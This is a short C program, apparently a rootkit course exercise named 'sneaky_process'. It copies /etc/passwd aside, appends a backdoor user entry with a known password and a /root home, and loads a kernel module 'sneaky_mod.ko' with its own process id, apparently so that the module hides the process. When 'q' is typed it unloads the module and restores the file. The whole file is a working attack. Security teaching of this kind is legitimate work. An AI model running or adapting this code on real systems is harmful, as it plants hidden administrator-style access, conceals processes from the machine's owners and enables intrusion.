#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

int main(void){
    int pid = getpid();
    printf("sneaky_process pid = %d\n", pid);
    system("cp -f /etc/passwd /tmp");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
    char command[40]="insmod sneaky_mod.ko pid=\"";
    char pidstr[12];
    sprintf(pidstr, "%d", pid);
    strcat(command, pidstr);
    strcat(command, "\"");
    system(command);
    int c;
    while(1){
      c=getchar();
      if(c=='q'){
	break;
      }
    }
    system("rmmod sneaky_mod");
    system("mv -f /tmp/passwd /etc");
    return EXIT_SUCCESS;
}
